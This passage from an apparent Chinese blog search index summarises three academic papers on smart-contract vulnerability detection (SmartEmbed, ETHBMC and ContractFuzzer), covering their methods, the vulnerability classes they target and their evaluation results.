Embedding)</h5><p>基于每个标记的基本矢量表示，将更高级别代码片段（例如，语句，函数，子合同和合同）的代码嵌入组合在一起。更具体地说，将特定代码片段（a particular code fragment）的代码嵌入定义为其所有组成标记（constituent tokens）的嵌入之和。</p><h4 id="2-4-4-嵌入矩阵（Embedding-Matrices）"><a href="#2-4-4-嵌入矩阵（Embedding-Matrices）" class="headerlink" title="2.4.4 嵌入矩阵（Embedding Matrices）"></a>2.4.4 嵌入矩阵（Embedding Matrices）</h4><p>通过将各个向量堆叠在一起，获得用于克隆检测的源代码嵌入矩阵$ C^{c×d}$和用于错误检测的错误语句嵌入矩阵$ B^{b×d}$。</p><h5 id="源代码嵌入矩阵-Source-Code-Embedding-Matrix-C-c×d"><a href="#源代码嵌入矩阵-Source-Code-Embedding-Matrix-C-c×d" class="headerlink" title="源代码嵌入矩阵(Source Code Embedding Matrix) $ C^{c×d}$"></a>源代码嵌入矩阵(Source Code Embedding Matrix) <strong>$ C^{c×d}$</strong></h5><ul><li>第一个维度c是合同总数；</li><li>第二维d是我们先前设置的代码嵌入大小。</li><li>第i个元素Ci（i = 1，2，…，c）是第i个合约的向量表示</li></ul><h5 id="Bug声明嵌入矩阵（Bug-Statement-Embedding-Matrix）-B-b×d"><a href="#Bug声明嵌入矩阵（Bug-Statement-Embedding-Matrix）-B-b×d" class="headerlink" title="Bug声明嵌入矩阵（Bug Statement Embedding Matrix）**$ B^{b×d}$**"></a>Bug声明嵌入矩阵（Bug Statement Embedding Matrix）**$ B^{b×d}$**</h5><ul><li>第一维b对应于我们的错误数据库中的错误语句总数，并且矩阵的每一行，即Bi（i = 1，2，…，b）表示针对特定错误语句嵌入的代码。</li></ul><h4 id="2-4-5-相似性检查（Similarity-Checking-）"><a href="#2-4-5-相似性检查（Similarity-Checking-）" class="headerlink" title="2.4.5 相似性检查（Similarity Checking:）"></a>2.4.5 相似性检查（Similarity Checking:）</h4><p>定义了一个相似性度量，用于克隆检测和错误检测的下游任务。定义：假设C1和C2是两个代码片段，而e1和e2是它们相应的代码嵌入。定义两个代码段之间的语义距离以及相似性，如下所示：</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200829190404.png" alt="image-20200808011231285"></p><p>给定任意两个代码片段Ci和Cj，如果它们的相似性得分超过特定的相似性阈值δ，则将Ci和Cj视为一个克隆对。</p><h4 id="2-4-6-克隆检测和错误检测"><a href="#2-4-6-克隆检测和错误检测" class="headerlink" title="2.4.6 克隆检测和错误检测"></a>2.4.6 克隆检测和错误检测</h4><p>克隆检测和Bug检测任务都可以视为查找“相似”代码的问题的变体，具体取决于相似性的定义。</p><ul><li>对于克隆检测，测量智能合约对之间的相似性，如果相似性得分超过克隆的预定义阈值，则将它们识别为克隆。</li><li>对于Bug检测，在给定的合同中搜索与已知错误相似的代码片段，而不是预先定义的错误阈值。</li></ul><h2 id="三、实验评估"><a href="#三、实验评估" class="headerlink" title="三、实验评估"></a>三、实验评估</h2><p>将SMARTEMBED实施为独立的Web服务，以帮助Solidity开发人员检查其智能合约。</p><h3 id="3-1-数据采集（Data-Collection）"><a href="#3-1-数据采集（Data-Collection）" class="headerlink" title="3.1 数据采集（Data Collection）"></a>3.1 数据采集（Data Collection）</h3><p>我们使用EtherScan收集了22,275份经过验证的Solidity智能合约，该合约是Ethereum的区块浏览器和分析平台。这些合同包含135,239个分包合同，631,261个函数，大约200万份报表和700万行代码。同时，收集了22个著名的易受攻击的智能合约，并在合约中查明了37条错误语句，这些语句用作SMARTEMBED的错误数据库。</p><h3 id="3-2-后端模型（Backend-Model-）"><a href="#3-2-后端模型（Backend-Model-）" class="headerlink" title="3.2 后端模型（Backend Model.）"></a>3.2 后端模型（Backend Model.）</h3><p>收集到的合同源代码被输入描述方法的工作流中，输出是代码嵌入，它们被用作相似性检查的后端模型。</p><p>我们将SMARTEMBED与两个专用于克隆检测（扩展为Solidity的DECKARD [9]）和错误检测（SmartCheck [3]）的著名工具进行了比较。</p><h3 id="3-3-前端用户界面（Frontend-User-Interface-）。"><a href="#3-3-前端用户界面（Frontend-User-Interface-）。" class="headerlink" title="3.3 前端用户界面（Frontend User Interface.）。"></a>3.3 前端用户界面（Frontend User Interface.）。</h3><p>在用户界面上，SMARTEMBED提供了一个输入框，供Solidity开发人员提交其源代码。在Solidity开发人员将其源代码提交给服务器后，将对源代码进行解析和规范化，然后通过我们的后端模型将合同和每个语句转换为向量，以进行相似性检查。输出分为两个单独的结果选项卡。</p><p>初始化Web工具</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200829190405.png" alt="1"></p><p>对于克隆检测结果选项卡，SMARTEMBED返回我们代码库中前5名最相似的克隆合同以及相似性得分，并链接到它们在EtherScan中的位置。</p><p>将智能合约粘贴到文本区域，然后单击“summit”。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200829190406.png" alt="2"></p><p>对于Bug检测结果，SMARTEMBED突出显示提交的源代码中的错误行，并将错误类型报告给开发人员。</p><p>bug检测结果将显示如下。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200829190407.png" alt="3"></p><h3 id="3-4-实验总结"><a href="#3-4-实验总结" class="headerlink" title="3.4 实验总结"></a>3.4 实验总结</h3><p>对于克隆检测，针对22,725个智能合约源代码运行了DECKARD和SMARTEMBED，实验结果表明，两种工具都将大约660万行代码识别为代码克隆，而总行数仅为730万，这意味着克隆的可靠性代码约为90％，远高于传统软件。 </p><p>对于漏洞检测，SMARTEMBED可以更有效，更准确地识别以太坊区块链中与克隆相关的漏洞。当相似度阈值设置为0.95时，SMARTEMBED工具会报告202个与克隆相关的错误，手动验证这些候选错误，其中194个被标记为真实错误，而SmartCheck只能检测其中的117个。</p><h2 id="四、总结评论"><a href="#四、总结评论" class="headerlink" title="四、总结评论"></a>四、总结评论</h2><p>本文介绍了SMARTEMBED，这是一种用于准确高效地检测智能合约中的代码克隆和错误的Web服务工具，能够极大地节省了效率。它开发了一种用于Solidity代码中的代码嵌入技术，并利用相似性检查来搜索满足某些阈值的“相似”代码。该方法针对从以太坊区块链收集的合同和错误数据是自动化的。<br>这是一种轻量级的智能合约漏洞检测工具，不过很依赖于所存储的bug数据库，只能找到已知的合约漏洞，不能自主发现最新的漏洞，这点算是不足。</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ETHBMC: A Bounded Model Checker for Smart Contracts</title>
    <link href="/2020/07e753fece.html"/>
    <url>/2020/07e753fece.html</url>
    
    <content type="html"><![CDATA[<h1 id="ETHBMC-A-Bounded-Model-Checker-for-Smart-Contracts"><a href="#ETHBMC-A-Bounded-Model-Checker-for-Smart-Contracts" class="headerlink" title="ETHBMC: A Bounded Model Checker for Smart Contracts"></a>ETHBMC: A Bounded Model Checker for Smart Contracts</h1><p>论文题目：(2020-USENIX) <a href="https://www.usenix.org/conference/usenixsecurity20/presentation/frank">ETHBMC: A Bounded Model Checker for Smart Contracts</a> ——智能合约的边界模型检查器</p><p>论文引用：Frank J, Aschermann C, Holz T. {ETHBMC}: A Bounded Model Checker for Smart Contracts[C]//29th {USENIX} Security Symposium ({USENIX} Security 20). 2020: 2757-2774.</p><p>本文发表在<a href="https://www.usenix.org/conference/usenixsecurity20/technical-sessions">USENIX Security ‘20</a>的第8月14日下午的Track 2 Blockchains部分，第一作者是来自位于德国的<strong>波鸿鲁尔大学</strong>(Ruhr-Universität Bochum；RUB)的<a href="https://scholar.google.com/citations?hl=zh-CN&user=VaOyZyoAAAAJ&view_op=list_works&sortby=pubdate">Frank J</a>.，之前的工作也没有跟智能合约特别关联的。</p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>智能合约极大地推动了加密货币的发展，然而其金钱收益的前景吸引来了别有用心之人，导致了骇人听闻的黑客攻击，导致数百万美元的货币损失。为了减少这些攻击的损失，一些强大的静态分析工具(static analysis tools)被开发了出来。本文对最近提出的八种对智能合约进行静态分析的工具进行了研究，并发现它们都无法探测到以太坊生态的所有相关特征：比如缺失精确的内存模型(a precise memory model)和只有少部分支持合约间的分析(inter-contract analysis)。基于以上，本文设计并实现了基于<strong>符号执行（symbolic execution）</strong>的边界模型检查器（a bounded model checker）——ETHBMC，它提供了一种以太坊网络的精确模型。本文通过一系列实验展现了这个EthBMC的功能：</p><ol><li>跟八种上述提到的八种工具进行比较，发现就算一个简单示例（relatively simple toy examples），这些工具也力有未逮。</li><li>本文利用EthBMC截止2018年12月依然活跃的220万个智能合约进行漏洞扫描，自动检测到了<strong>5905个</strong>可以触发漏洞的有效输入，比之前的提出方法多检测出22.8%的输入；其中1989个可以随意摧毁合约，也就是自毁合约（suicidal contracts），而其余的漏洞可以被攻击者利用来任意提取金钱。</li></ol><h2 id="二、知识铺垫"><a href="#二、知识铺垫" class="headerlink" title="二、知识铺垫"></a>二、知识铺垫</h2><p>在了解具体实验部分， 首先需要了解一些基础的知识</p><h3 id="2-1-以太坊虚拟机-Ethereum-Virtual-Machine"><a href="#2-1-以太坊虚拟机-Ethereum-Virtual-Machine" class="headerlink" title="2.1  以太坊虚拟机  Ethereum Virtual Machine"></a>2.1  以太坊虚拟机  Ethereum Virtual Machine</h3><p>以太坊定义了一种专用的、基于堆栈的虚拟机，称为以太坊虚拟机（EVM），用于确定智能合约执行的结果。机器对字节码（bytecode）进行操作，其中每个操作数(operand)将值弹出或推入数据堆栈，每个值具有256位字长。此外，EVM增强了针对加密货币环境量身定制的几种机制：</p><ol><li><strong>World State</strong>：以太坊世界状态是整个系统的状态。它由两部分组成，从帐户地址到帐户状态的映射以及当前块信息。<strong>帐户状态是</strong>一个包含多个信息的元组，例如帐户的当前余额。此外，如果帐户是智能合约，则帐户状态还包含<strong>字段代码</strong>和<strong>存储</strong>。代码字段保存智能合约的代码，而存储是用于在多个合约调用之间保留值的永久性存储器。</li><li>Memory：EVM区分三种不同类型的内存：<ol><li>Storage:该存储是一个持久键值存储，它将256位键映射到256位值。</li><li>Calldata:交易的数据部分用于向合同提供用户输入，这是一个可字节寻址的数据数组（a byte addressable data array），在执行期间不可变。</li><li>Execution Memory:该存储器是易失性字节数组（volatile byte array），仅在整个执行过程中一直保持不变。</li></ol></li></ol><h3 id="2-2-符号执行与可满足性模理论-Symbolic-Execution-and-SMT-Solving"><a href="#2-2-符号执行与可满足性模理论-Symbolic-Execution-and-SMT-Solving" class="headerlink" title="2.2  符号执行与可满足性模理论 Symbolic Execution and SMT Solving"></a>2.2  符号执行与可满足性模理论 Symbolic Execution and SMT Solving</h3><p>符号执行的主要思想就是将输入(input)用<strong>符号</strong>来表征而不是具体值，同时将程序变量表征成符号表达式。因此，程序的输出就会被表征成一个程序输入的函数，即fun(input)。在软件测试中，符号执行被用于生成执行路径(execution path)的输入。</p><p>产生符号函数执行fun( $\alpha$ )，其中$\alpha$ 代表整个输入域，例如32位整数，从而探索程序可以采用的所有可能路径。当到达一个分支（例如，if语句）时，执行被分叉以探索两种可能的路径。为了保持较低的探索状态空间，符号执行程序将程序的当前状态（the current state of the program）以及路径条件（path condition）（例如x &lt;= 3）编码为一阶逻辑公式。使用可满足性模理论（SMT，Satisfiability Modulo Theory）求解器，以检查程序路径是否可行，避免进一步探索不可能的路径。</p><p>执行路径(execution path)：一个true和false的序列seq={p0,p1,…,pn}。其中，如果是一个条件语句，那么pi=ture则表示这条条件语句取true，否则取false。<br>执行树(execution tree)：一个程序的所有执行路径则可表征成一棵执行树。</p><p>SMT公式以一阶逻辑表示（first-order logic），是命题逻辑（propositional logic）（也称为布尔逻辑）的扩展，它提供了多种不同的理论来阐述问题。SMT求解器通过枚举（enumeration）执行证明：它试图找到约束系统的满意（具体）分布，从而证明可以求解。在对程序的执行进行建模时，此具体分配为程序提供了输入，可用于达到给定状态。当我们另外将故障条件编码为逻辑公式并找到令人满意的分配（即执行和故障条件）时，此具体分配就是程序的输入，触发相应的软件故障。</p><h3 id="2-3-分析智能合约的挑战"><a href="#2-3-分析智能合约的挑战" class="headerlink" title="2.3 分析智能合约的挑战"></a>2.3 分析智能合约的挑战</h3><p>本文首先通过一系列简单示例来说明在分析智能合约时遇到的常见障碍。</p><h4 id="2-3-1-The-Keccak256-Function"><a href="#2-3-1-The-Keccak256-Function" class="headerlink" title="2.3.1  The Keccak256 Function"></a>2.3.1  The Keccak256 Function</h4><p>keccak25用于在执行内存区域上计算keccak哈希。该函数可以由keccak256关键字调用。展示了该函数的更“隐藏”用法，其中该指令用于计算内存位置。EVM的存储是可字寻址的存储器，固定大小的数据类型分配有固定的内存插槽。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901201737.png" alt="image-20200712093728017"></p><p>在处理动态数据类型时，即在执行期间其大小可能会增加的类型时，我们不知道要分配多少个内存插槽。基于实体的智能合约求助于动态计算内存偏移。当写入映射时（第3行），相应的存储位置将计算为keccak256（k || p），其中k是映射（映射）的键，p是在编译时选择的常数。请注意，如果可以使用此方案生成有效的哈希冲突，则先前的值将被覆盖。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901201738.png" alt="image-20200712094233265"></p><h4 id="2-3-2-Memcopy-like-Instructions"><a href="#2-3-2-Memcopy-like-Instructions" class="headerlink" title="2.3.2 Memcopy-like Instructions"></a>2.3.2 Memcopy-like Instructions</h4><p>EVM无法直接访问Calldata，它只能对执行内存中的数据进行操作，即复制输入数据。In Listing 3，string是无限制的数据类型，导致EVM利用CALLDATACOPY指令将整个输入复制到执行内存。这与具有固定宽度（例如uint256）的数据类型形成对比，该数据类型可以通过从calldata的普通读取中访问。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901201739.png" alt="image-20200712094818820"></p><h4 id="2-3-3-Inter-Contract-Communication"><a href="#2-3-3-Inter-Contract-Communication" class="headerlink" title="2.3.3 Inter-Contract Communication"></a>2.3.3 Inter-Contract Communication</h4><p>以太坊当前的合约拓扑。大多数合同不是由人部署的，而是由其他合同创建的，使这些合同成为合同内交互的一部分Listin 4中提供了一个简单的示例。在执行Target的过程中，调用了一个library contract 来模拟两个合约之间的简单交互。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901201740.png" alt="image-20200712095251928"></p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901201741.png" alt="image-20200712095227233"></p><h4 id="2-3-4-The-Parity-Wallet-Bug"><a href="#2-3-4-The-Parity-Wallet-Bug" class="headerlink" title="2.3.4 The Parity Wallet Bug"></a>2.3.4 The Parity Wallet Bug</h4><p>Parity钱包分为两个合同，一个是持有大部分代码库的库合同，另一个是用户部署的客户合同。一旦部署，智能合约就不会改变，因此，在更改（或修订）合约时，必须重新部署并因此偿还整个合约。EVM提供DELEGATECALL指令，该指令用于在执行时使用另一个帐户的代码。这些指令在仍然使用原始帐户上下文和存储的同时切换了要执行的代码。</p><p>如下图5，假设用户Alice要使用Parity钱包库（the Parity wallet library）。她使用存储变量来部署她的客户代码（第15-23行），该存储变量包含库合约的帐户地址（第16行）。稍后调用她的客户合同时，它将delegates给库代码（第22行），转发交易的Calldata（msg.data）。这意味着如果攻击者可以将合同的控制流重定向到自己喜欢的地址，那么他们就有能力任意执行代码（例如提取所有资金）。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901201742.png" alt="image-20200712200747334"></p><h2 id="三、设计实现"><a href="#三、设计实现" class="headerlink" title="三、设计实现"></a>三、设计实现</h2><p>文章中提供了ETHBMC架构的概述，该工具包括三个主要模块，符号执行器（symbolic executor），检测模块（ a detection module）和验证模块（a validation module）。 ETHBMC在大约13,000行Rust代码中实现。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412110934.png" alt="image-20200712100024244"></p><p>（High-level overview of ETHBMC and its inner workings）</p><p>ETHBMC利用其符号执行引擎来探索程序可以到达的可用状态空间：</p><ul><li>在探索过程中，可以随时将达到此状态所需的必要条件（或约束）转换为一阶逻辑。</li><li>探索结束时，即执行终止于停止状态，我们使用其他约束对攻击者的目标进行编码，例如，我们对一个约束进行编码，即在最后执行状态下，攻击者帐户的余额必须高于在第一个状态下的余额。</li><li>利用后端SMT求解器来求解约束系统。SMT求解器通过枚举执行证明：它试图找到约束系统的满意（具体）分配，从而证明可以求解，既达到有效的暂停状态又满足攻击者模型的令人满意的任务证明了合同中的漏洞。</li><li>运行具体的脱机程序执行SMT求解器找到的是智能合约的能触发漏洞的有效输入（即交易）的正确性。</li></ul><h3 id="3-1-Symbolic-Executor"><a href="#3-1-Symbolic-Executor" class="headerlink" title="3.1  Symbolic Executor"></a>3.1  Symbolic Executor</h3><p>以广度优先搜索方式探索智能合约，每当Executor需要断言给定代码路径的可满足性时，都会查询后端的SMT求解器（Yices2 ）。Executor会探索所有代码路径，直到它们到达停止状态、求解器超时或拒绝该路径。如果在执行过程中遇到循环，则使用循环展开（loop-unrolling），即执行n次循环，然后退出循环，并采用相同的策略来限制 求解深度（因为在具有多个帐户的环境中，合同可能会无限循环地相互调用。</p><h3 id="3-2-Detection-Module"><a href="#3-2-Detection-Module" class="headerlink" title="3.2 Detection Module"></a>3.2 Detection Module</h3><p>使用其他路径约束（additional path constraints）对攻击者的目标进行编码，推出了一个附加约束，以指定在执行当前交易后，攻击者帐户的余额必须高于整个分析开始时的余额。当遇到DELEGATECALL或CALLCODE指令时，工具创建了一个附加的hijack状态，在这里我们试图劫持合同的控制流。然后为劫持添加了一个约束，将CALLCODE /DELEGATECAL的目标地址限制为攻击者的帐户地址。如果可以满足此约束条件，则可以重定向控制流（the control<br>flow）。</p><p>标记执行SELFDESTRUCT指令的状态，以检测可被外部攻击者破坏的合同。请注意，如果可以使用SELFDESTRUCT指令从帐户中窃取资金，则ETHBMC会检测到这两种情况。如果我们检测到任何类型的漏洞，就会将相应的状态传递给验证模块。</p><h3 id="3-3-Validation-Module"><a href="#3-3-Validation-Module" class="headerlink" title="3.3 Validation Module"></a>3.3 Validation Module</h3><p>在最后一步中，尝试为具有可行攻击路径的每个状态生成有效事务（valid transactions）。我们利用SMT求解器生成触发漏洞所需的交易数据。成功生成攻击数据后，利用go-ethereum 工具套件（尤其是EVM实用程序）以脱机方式模拟攻击，<br>以验证它们的有效性。</p><h2 id="四、实验评估"><a href="#四、实验评估" class="headerlink" title="四、实验评估"></a>四、实验评估</h2><p>在几个不同的实验中对ETHBMC进行了评估，然后重点关注以下主要结果，介绍的玩具示例用作一组试验。我们将SELFDESTRUCT指令嵌入每个合同中，因为所有工具都为此提供了检测模块。此外，重新创建了上节中讨论的奇偶校验帐户黑客（Parity account hack）程序，以模拟复杂的实际情况。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901202054.png" alt="image-20200712194526587">（Results of evaluating different analyzers on toy examples）</p><p>为了进一步评估ETHBMC，他们在实验中集群：大学内部云中的20个虚拟机，运行6个2.5 Ghz虚拟化内核，每个内核分配12 GB的内存。此外，在两台服务器上运行了12个ETHBMC实例，每个实例均配备了Intel Xeon E5-2667和96GB内存。<br>截至2018年12月24日在Google BigQuery 上列出的所有2,194,650个账户进行了大规模扫描，整个集群总共花费了大约3.5个月的时间，大约相当于39个CPU年。</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901202128.png" alt="image-20200712195205101"></p><p>(大规模分析结果显示找到的合同数量（括号内生成的独特漏洞利用数量）)</p><h2 id="五、文章总结"><a href="#五、文章总结" class="headerlink" title="五、文章总结"></a>五、文章总结</h2><p>其是第一个能够以全自动的方式检测到奇偶校验漏洞（Parity vulnerability）的工具，发现可以通过内存复制式操作、提高合约间通信和引入新的编码方式来精确推理加密哈希函数以实现更高精确度的分析。但是在却在边界循环和设置时间受到了限制，而且限制不能完全取消，例如，总是必须对循环施加上限，但提高超时限制或循环计数可能会导致发现程序中更深处的错误。合同调用也是如此，ETHBMC无法找到需要三个以上事务的错误。此外，他们目前仅为一个攻击者帐户建模。</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
      <tag>符号执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ContractFuzzer:Fuzzing Smart Contracts for Vulnerability Detection</title>
    <link href="/2020/0629bf6aec.html"/>
    <url>/2020/0629bf6aec.html</url>
    
    <content type="html"><![CDATA[<h1 id="ContractFuzzer-Fuzzing-Smart-Contracts-for-Vulnerability-Detection"><a href="#ContractFuzzer-Fuzzing-Smart-Contracts-for-Vulnerability-Detection" class="headerlink" title="ContractFuzzer: Fuzzing Smart Contracts for Vulnerability Detection"></a>ContractFuzzer: Fuzzing Smart Contracts for Vulnerability Detection</h1><p>论文标题：(2018-ASE) <a href="https://ieeexplore.ieee.org/abstract/document/9000089">ContractFuzzer: Fuzzing Smart Contracts for Vulnerability Detection</a></p><p>论文引用：Jiang B, Liu Y, Chan W K. Contractfuzzer: Fuzzing smart contracts for vulnerability detection[C]//2018 33rd IEEE/ACM International Conference on Automated Software Engineering (ASE). IEEE, 2018: 259-269.</p><p>代码开源：<a href="https://github.com/gongbell/ContractFuzzer">gongbell/ContractFuzzer</a></p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>智能合约是运行在区块链共识协议上的程序，它使得人们能够在最小化信任的基础上达成共识。而今数以百万计的智能合约部署在各个分散的应用程序中，而智能合约的安全漏洞造成了巨大的经济损失。</p><p>本文提出了一种新的模糊测试工具：ContractFuzzer，它能够根据智能合约的<strong>ABI规范生成模糊测试输入</strong>，定义检测<strong>安全漏洞的测试预言（test oracle）</strong>，通过对<strong>以太坊虚拟机（EVM）插桩</strong>记录智能合约的运行时状态，分析日志并报告安全漏洞。通过实验，作者对6991份智能合约的检测已经发现了459个高精确度的漏洞。</p><h2 id="二、设计实现"><a href="#二、设计实现" class="headerlink" title="二、设计实现"></a>二、设计实现</h2><p>文章分析了七种不同类型的智能合约安全漏洞：gas耗尽终止（<strong>Gasless Send</strong>）、异常处理混乱（<strong>Exception Disorder</strong>）、重入（<strong>Reentrancy</strong>）、时间戳依赖（<strong>Timestamp Dependency</strong>）、区块号依赖(<strong>Block Number Dependency</strong>)、危险的delegatecall 调用（<strong>Dangerous DelegateCall</strong>）和以太币冻结（<strong>Freezing Ether</strong>）。并对以上七种安全漏洞定义了测试预言（test orcle)。</p><h3 id="2-1-gas耗尽终止"><a href="#2-1-gas耗尽终止" class="headerlink" title="2.1 gas耗尽终止"></a>2.1 gas耗尽终止</h3><p>测试预言GaslessSend检查：</p><ul><li>函数调用是通过Send函数进行的，即该函数调用的输入为0，Gas限制为2300；</li><li>函数调用在执行时返回错误ErrOutOfGas。</li></ul><h3 id="2-2-异常处理混乱"><a href="#2-2-异常处理混乱" class="headerlink" title="2.2 异常处理混乱"></a>2.2 异常处理混乱</h3><p>对于一个嵌套调用链，测试预言ExceptionDisorder检查：</p><ul><li>由原始调用开始的嵌套调用链中的调用抛出异常，但是原始调用没有抛出异常。</li></ul><h3 id="2-3-重入"><a href="#2-3-重入" class="headerlink" title="2.3 重入"></a>2.3 重入</h3><p>测试预言Reentrancy包括两个子预言ReentrancyCall与CallAgentWithValue：</p><p>Reentrancy = ReentrancyCall &amp; CallAgentWithValue</p><ul><li><p>子预言ReentrancyCall检查： </p><ul><li>原始函数调用在由其开始的嵌套调用链中出现了不止一次。</li></ul></li><li><p>子预言CallAgentWithValue检查： + 函数调用所发送的以太币大于0； </p><ul><li>被调用函数拥有充足的Gas执行复杂的代码，即函数调用不是通过Send函数或Transfer函数进行的； </li><li>被调用合约由原始合约调用者指定，而不是硬编码在原始合约中的</li></ul></li></ul><h3 id="2-4-时间戳依赖-amp-区块号依赖"><a href="#2-4-时间戳依赖-amp-区块号依赖" class="headerlink" title="2.4 时间戳依赖 &amp; 区块号依赖"></a>2.4 时间戳依赖 &amp; 区块号依赖</h3><p>这两者可以放在一起进行检查，其中测试预言Timestamp Dependency/BlockNum Dependency包括三个子预言TimestampOp / BlockNumOp、SendCall与EtherTransfer：</p><p>2.4.1 子预言TimestampOp/BlockNumOp检查：</p><ul><li>当前合约的执行过程中执行了TIMESTAMP/NUMBER操作符。</li></ul><p>2.4.2 子预言SendCall检查：函数调用是通过Send函数进行的。</p><p>2.4.3 子预言EtherTransfer检查:</p><ul><li>函数调用所发送的以太币大于0。</li></ul><h3 id="2-5-危险的delegatecall-调用"><a href="#2-5-危险的delegatecall-调用" class="headerlink" title="2.5 危险的delegatecall 调用"></a>2.5 危险的delegatecall 调用</h3><p>测试预言DangerDelegateCall检查：</p><ul><li>当前合约执行过程中通过DelegateCall函数进行了函数调用；</li><li>DelegateCall函数的参数是由当前合约调用者指定的。</li></ul><h3 id="2-6-以太币冻结"><a href="#2-6-以太币冻结" class="headerlink" title="2.6 以太币冻结"></a>2.6 以太币冻结</h3><p>测试预言FreezingEther检查：</p><ul><li>当前合约能够接收以太币；</li><li>当前合约执行过程中通过DelegateCall函数进行了函数调用；</li><li>当前合约自己的代码中没有transfer/send/call/suicide函数。</li></ul><p>ContractFuzzer工具包括一个线下的EVM插桩工具以及一个线上的模糊测试工具。<strong>线下的EVM插桩工具通过对EVM进行插桩</strong>，使得模糊测试工具能够监视智能合约的执行并提取执行日志用于漏洞分析。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20210412105155.png" alt="image-20200901201058793"></p><p>文章实现了一个网络爬虫从Etherscan网站上爬取以太坊平台上已经部署的智能合约，爬取内容包括合约创建代码、ABI接口与构造函数参数。文章将爬取的智能合约重新部署在自己搭建的以太坊测试网络中，一方面作为之后模糊测试的对象，另一方面作为使用合约地址作为参数的合约调用的输入。线上的模糊测试过程如下：</p><ul><li>分析测试智能合约的ABI接口以及字节码，提取ABI函数的每一个参数的数据类型以及ABI函数中所使用到的函数签名；</li><li>对于所有从以太坊平台上爬取的智能合约进行<strong>ABI签名分析</strong>，并根据各个智能合约所支持的函数签名将其进行索引；</li><li>生成与ABI规范相符的<strong>合法模糊测试输入</strong>以及越过有效边界的<strong>突变输入</strong>；</li><li>启动模糊测试，通过随机的函数调用，使用生成的输入调用相应的ABI接口；</li><li>分析模糊测试过程中生成的执行日志，检测安全漏洞。</li></ul><h2 id="三、实验评估"><a href="#三、实验评估" class="headerlink" title="三、实验评估"></a>三、实验评估</h2><p>实验机器配置：Ubuntu 14.04 LTS and is equipped with Intel i5 8-core CPU and 16GB of memory.</p><p>文章从Etherscan网站上爬取了共<strong>6991</strong>个互不相同且包含经过验证的源代码的智能合约作为实验对象。对于测试智能合约的每个ABI函数，ContractFuzzer工具使用三种类型的账户对其进行调用，包括：</p><ol><li>创建合约的外部账户</li><li>与合约无关的普通外部账户</li><li>AttackerAgent合约账户</li></ol><p>此外，通过每种类型的账户，工具分别使用发送以太币和不发送以太币两种模式对ABI函数进行调用。对于每个包含参数的ABI函数，工具生成k个输入作为函数的输入集。</p><p>ContractFuzzer工具把对于某个合约生成的所有调用合并成一个调用池，并随机从调用池中选择调用进行对该合约进行模糊测试，以模拟合约中ABI函数的不同调用序列。文章使ContractFuzzer工具对所有测试智能合约共进行了80个小时的模糊测试，直至实验结果逐渐趋同。下表是最后的实验结果:</p><p><img src="https://gitee.com/Reanon/upload-markdown-img/raw/master/img/20200901201113.png" alt="image-20200901201112926"></p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>文章是第一个基于Ethereum 平台的智能合约安全漏洞模糊测试框架，支持gas耗尽终止、异常处理混乱、重入、时间戳依赖、区块号依赖、危险的delegatecall 调用和以太币冻结七种漏洞的检测。ContractFuzzer 包含离线EVM 测试工具和在线模糊测试工具，并且将这些工具开源。</p><p>构建了一个Web 爬虫，从Etherscan 网站上获得部署在以太坊上的智能合约，爬虫可以提取合约创建代码( 智能合约的二进制文件) 、应用程序二进制接口( Application BinaryInterface，ABI) 以及这些合约的构造函数参数。和其他智能合约漏洞检测工具相比，ContractFuzzer 支持更多的漏洞类型，有效降低了误报率; 但由于测试用例生成的随机性，所能涵盖的系统行为有限，无法达到理想的路径覆盖率，很难找出所有的潜在错误</p>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
      <tag>模糊测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
